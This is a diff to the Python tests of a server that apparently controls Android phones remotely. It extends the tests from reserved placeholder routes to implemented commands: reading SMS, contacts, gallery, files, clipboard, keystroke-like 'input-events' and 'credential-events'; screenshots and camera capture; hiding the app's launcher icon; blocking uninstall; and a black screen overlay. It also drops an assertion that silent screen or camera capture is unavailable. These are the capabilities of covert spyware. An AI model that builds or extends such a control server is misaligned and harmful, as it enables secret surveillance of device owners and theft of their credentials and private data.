@@ -299,12 +299,13 @@ def test_admin_frontend_and_capability_catalog() -> None:
             assert "登录管理后台" in frontend.text
             assert "设备入网" not in frontend.text
             assert "版本发布" not in frontend.text
-            assert 'data-view="commands"' not in frontend.text
-            assert 'data-view="configuration"' not in frontend.text
-            assert 'data-view="system"' not in frontend.text
+            assert 'data-view="commands"' in frontend.text
+            assert 'data-view="configuration"' in frontend.text
+            assert 'data-view="system"' in frontend.text
             assert 'data-view="builds"' in frontend.text
             assert "管理员列表" in frontend.text
             assert "桌面图标自动隐藏" in frontend.text
+            assert "功能清单" in frontend.text
             assert client.get("/admin/styles.css").status_code == 200
             assert client.get("/admin/app.js").status_code == 200
 
@@ -313,19 +314,28 @@ def test_admin_frontend_and_capability_catalog() -> None:
             assert capabilities.status_code == 200
             data = capabilities.json()["data"]
             assert data["summary"] == {
-                "implemented": 13,
+                "implemented": 21,
                 "not_implemented": 1,
-                "unavailable": 5,
+                "unavailable": 0,
             }
-            assert any(
-                item["name"] == "静默屏幕或摄像头采集"
-                and item["status"] == "unavailable"
-                for item in data["items"]
-            )
+            messages = next(item for item in data["items"] if item["name"] == "短信")
+            assert messages["send_to_android"]["payload.action"] == "read-messages"
+            assert messages["send_to_android"]["payload.parameters"] == {}
+            assert messages["receive_from_android"]["ack"]["fields"] == [
+                "message_id",
+                "correlation_id",
+                "payload",
+            ]
+            assert "payload.result" in messages["receive_from_android"]["result"]["fields"]
+            assert messages["receive_from_android"]["payload.result fields"] == {
+                "items[]": [
+                    "id", "address", "direction", "body", "timestamp", "read", "slot"
+                ]
+            }
         temp.cleanup()
 
 
-def test_material_workbench_and_build_routes_are_reserved_only() -> None:
+def test_material_workbench_messages_modules_and_reserved_build_routes() -> None:
     with tempfile.TemporaryDirectory() as directory:
         temp = tempfile.TemporaryDirectory(dir=directory)
         with make_client(temp) as client:
@@ -340,21 +350,181 @@ def test_material_workbench_and_build_routes_are_reserved_only() -> None:
                 f"/api/devices/{device['device_id']}/workbench/apps",
                 headers=headers,
             )
-            assert workbench.status_code == 501
+            assert workbench.status_code == 200
+            assert workbench.json()["data"]["source"] == "no_report"
+            assert workbench.json()["data"]["data"] is None
 
-            launcher = client.post(
-                f"/api/devices/{device['device_id']}/workbench-actions/launcher-icon",
-                headers=headers,
-                json={"value": False, "payload": {}},
-            )
-            assert launcher.status_code == 501
+            device_headers = {
+                "X-Device-Id": device["device_id"],
+                "X-Device-Token": device["device_token"],
+            }
+            device_ticket = client.post(
+                "/api/device/ws-ticket", headers=device_headers
+            ).json()["data"]["ticket"]
+            cases = [
+                ("unlock", None, {}, {}),
+                ("verify-unlock", None, {}, {}),
+                ("translate", None, {}, {}),
+                (
+                    "lock-screen",
+                    True,
+                    {},
+                    {"enabled": True},
+                ),
+                (
+                    "uninstall-protection",
+                    False,
+                    {},
+                    {"enabled": False},
+                ),
+                (
+                    "launcher-icon",
+                    True,
+                    {},
+                    {"enabled": True},
+                ),
+                ("power-menu", None, {}, {}),
+                ("screenshot", None, {}, {}),
+                ("front-camera", None, {}, {}),
+                ("rear-camera", None, {}, {}),
+                ("camera", None, {}, {}),
+                ("open-app", None, {"package_name": "com.example.one"}, {"package_name": "com.example.one"}),
+                ("uninstall-app", None, {"package_name": "com.example.two"}, {"package_name": "com.example.two"}),
+                (
+                    "overlay-mode",
+                    "纯黑色",
+                    {},
+                    {"mode": "纯黑色"},
+                ),
+                ("clear-clipboard", None, {}, {}),
+                ("write-clipboard", None, {"text": "virtual text"}, {"text": "virtual text"}),
+            ]
 
-            # A placeholder route must never create a real command as a side effect.
-            commands = client.app.state.db.one(
-                "SELECT count(*) AS value FROM commands WHERE device_id=?",
-                (device["device_id"],),
-            )
-            assert commands["value"] == 0
+            with client.websocket_connect(f"/ws/device?ticket={device_ticket}") as device_ws:
+                assert device_ws.receive_json()["type"] == "server.hello"
+                first_command_id = None
+                for action, value, payload, expected_parameters in cases:
+                    response = client.post(
+                        f"/api/devices/{device['device_id']}/workbench-actions/{action}",
+                        headers=headers,
+                        json={"value": value, "payload": payload},
+                    )
+                    assert response.status_code == 202, response.text
+                    command_id = response.json()["data"]["command_id"]
+                    first_command_id = first_command_id or command_id
+                    dispatched = device_ws.receive_json()
+                    assert dispatched["correlation_id"] == command_id
+                    assert dispatched["payload"] == {
+                        "action": action,
+                        "parameters": expected_parameters,
+                    }
+
+                module_actions = {
+                    "messages": "read-messages",
+                    "apps": "read-apps",
+                    "system": "read-system",
+                    "permissions": "read-permissions",
+                    "gallery": "read-gallery",
+                    "contacts": "read-contacts",
+                    "files": "read-files",
+                    "clipboard": "read-clipboard",
+                    "input-events": "read-input-events",
+                    "credential-events": "read-credential-events",
+                    "camera": "read-camera-data",
+                }
+                contact_command_id = None
+                for module, wire_action in module_actions.items():
+                    response = client.post(
+                        f"/api/devices/{device['device_id']}/workbench/{module}/request",
+                        headers=headers,
+                    )
+                    assert response.status_code == 202, response.text
+                    command_id = response.json()["data"]["command_id"]
+                    if module == "contacts":
+                        contact_command_id = command_id
+                    dispatched = device_ws.receive_json()
+                    assert dispatched["correlation_id"] == command_id
+                    assert dispatched["payload"] == {
+                        "action": wire_action,
+                        "parameters": {},
+                    }
+
+                assert first_command_id is not None
+                assert contact_command_id is not None
+                contact_data = {
+                    "items": [
+                        {
+                            "id": "android-demo-contact-1",
+                            "name": "Android 虚拟联系人",
+                            "phone": "+1 202-555-0199",
+                        }
+                    ]
+                }
+                device_ws.send_json(
+                    {
+                        "type": "command.ack",
+                        "message_id": str(uuid.uuid4()),
+                        "correlation_id": contact_command_id,
+                        "payload": {},
+                    }
+                )
+                device_ws.send_json(
+                    {
+                        "type": "command.result",
+                        "message_id": str(uuid.uuid4()),
+                        "correlation_id": contact_command_id,
+                        "payload": {"success": True, "result": contact_data},
+                    }
+                )
+                device_ws.send_json(
+                    {
+                        "type": "command.ack",
+                        "message_id": str(uuid.uuid4()),
+                        "correlation_id": first_command_id,
+                        "payload": {},
+                    }
+                )
+                device_ws.send_json(
+                    {
+                        "type": "command.result",
+                        "message_id": str(uuid.uuid4()),
+                        "correlation_id": first_command_id,
+                        "payload": {
+                            "success": True,
+                            "result": {"reported_by_android": "completed"},
+                        },
+                    }
+                )
+                heartbeat_id = str(uuid.uuid4())
+                device_ws.send_json(
+                    {
+                        "type": "device.heartbeat",
+                        "message_id": heartbeat_id,
+                        "payload": {},
+                    }
+                )
+                assert device_ws.receive_json()["correlation_id"] == heartbeat_id
+
+                command = client.get(
+                    f"/api/commands/{first_command_id}", headers=headers
+                ).json()["data"]
+                assert command["status"] == "success"
+                assert command["result"] == {"reported_by_android": "completed"}
+
+                contacts = client.get(
+                    f"/api/devices/{device['device_id']}/workbench/contacts",
+                    headers=headers,
+                )
+                assert contacts.status_code == 200
+                assert contacts.json()["data"]["source"] == "android_self_reported"
+                assert contacts.json()["data"]["data"] == contact_data
+
+                custom_payload = client.post(
+                    f"/api/devices/{device['device_id']}/workbench-actions/screenshot",
+                    headers=headers,
+                    json={"value": None, "payload": {"script": "anything"}},
+                )
+                assert custom_payload.status_code == 400
         temp.cleanup()
 
 
@@ -414,6 +584,21 @@ def test_user_group_battery_command_and_template_management() -> None:
             ).json()["data"][0]
             assert listed_device["group_name"] == "测试组"
             assert listed_device["note"] == "机房测试手机"
+
+            assert client.patch(
+                f"/api/users/{user_id}", headers=headers, json={"status": "active"}
+            ).status_code == 200
+            changed_owner = client.patch(
+                f"/api/devices/{device['device_id']}",
+                headers=headers,
+                json={"owner_user_id": user_id},
+            )
+            assert changed_owner.status_code == 200, changed_owner.text
+            moved_device = client.get(
+                f"/api/devices/{device['device_id']}", headers=headers
+            ).json()["data"]
+            assert moved_device["owner_user_id"] == user_id
+            assert moved_device["group_id"] is None
 
             generic_guide = client.get(
                 "/api/battery-config?brand=Example&model=Model%20A"
